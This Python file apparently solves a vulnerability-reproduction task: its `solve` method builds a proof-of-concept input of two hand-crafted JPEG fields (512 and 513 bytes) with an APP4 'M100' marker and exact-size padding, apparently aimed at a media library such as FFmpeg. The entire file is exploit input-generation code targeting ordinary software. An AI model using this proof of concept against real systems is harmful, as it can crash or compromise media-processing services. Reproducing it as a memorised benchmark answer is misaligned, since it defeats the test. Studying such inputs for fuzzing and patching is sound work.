import struct
from typing import Optional


AV_INPUT_BUFFER_PADDING_SIZE = 64


def _be16(n: int) -> bytes:
    return struct.pack(">H", n & 0xFFFF)


def _seg(marker: int, payload: bytes) -> bytes:
    return bytes([0xFF, marker & 0xFF]) + _be16(len(payload) + 2) + payload


def _make_jpeg_field(app15_payload_len: int) -> bytes:
    # SOI
    out = bytearray(b"\xFF\xD8")

    # APP4 "M100" marker (to encourage conversion path)
    app4_payload = b"M100" + b"\x00\x00"
    out += _seg(0xE4, app4_payload)

    # APP15 padding blob to shape exact field size
    if app15_payload_len < 0:
        app15_payload_len = 0
    out += _seg(0xEF, b"\x00" * app15_payload_len)

    # DQT: 1 table, 8-bit precision, id 0, all ones
    dqt_payload = b"\x00" + (b"\x01" * 64)
    out += _seg(0xDB, dqt_payload)

    # SOF0: baseline, 8-bit, 1x1, 3 components (YCbCr), all using QTable 0
    sof0_payload = bytearray()
    sof0_payload += b"\x08"          # precision
    sof0_payload += _be16(1)         # height
    sof0_payload += _be16(1)         # width
    sof0_payload += b"\x03"          # components
    sof0_payload += bytes([1, 0x11, 0])  # Y: id=1, samp=1x1, qt=0
    sof0_payload += bytes([2, 0x11, 0])  # Cb: id=2, samp=1x1, qt=0
    sof0_payload += bytes([3, 0x11, 0])  # Cr: id=3, samp=1x1, qt=0
    out += _seg(0xC0, bytes(sof0_payload))

    # DHT: minimal DC/AC tables (id 0) with a single code each
    bits_16 = bytes([1] + [0] * 15)
    dht_payload = bytearray()
    # DC table class=0 id=0
    dht_payload += b"\x00" + bits_16 + b"\x00"
    # AC table class=1 id=0
    dht_payload += b"\x10" + bits_16 + b"\x00"
    out += _seg(0xC4, bytes(dht_payload))

    # SOS: 3 components, each uses DC/AC table 0
    sos_payload = bytearray()
    sos_payload += b"\x03"
    sos_payload += bytes([1, 0x00])
    sos_payload += bytes([2, 0x00])
    sos_payload += bytes([3, 0x00])
    sos_payload += b"\x00\x3F\x00"
    out += _seg(0xDA, bytes(sos_payload))

    # Entropy-coded data:
    # For 3 blocks (Y, Cb, Cr), each block: DC symbol 0 + AC EOB symbol 0.
    # With our minimal tables, each symbol is '0' (1 bit). Total 6 bits '0', pad with '1's -> 0b00000011.
    out += b"\x03"

    # EOI
    out += b"\xFF\xD9"
    return bytes(out)


class Solution:
    def solve(self, src_path: str) -> bytes:
        # Construct two JPEG fields (512 and 513 bytes) totaling 1025 bytes.
        # Base (without APP15) is 157 bytes; total = 161 + app15_payload_len.
        field1 = _make_jpeg_field(351)  # 161 + 351 = 512
        field2 = _make_jpeg_field(352)  # 161 + 352 = 513
        poc = field1 + field2
        return poc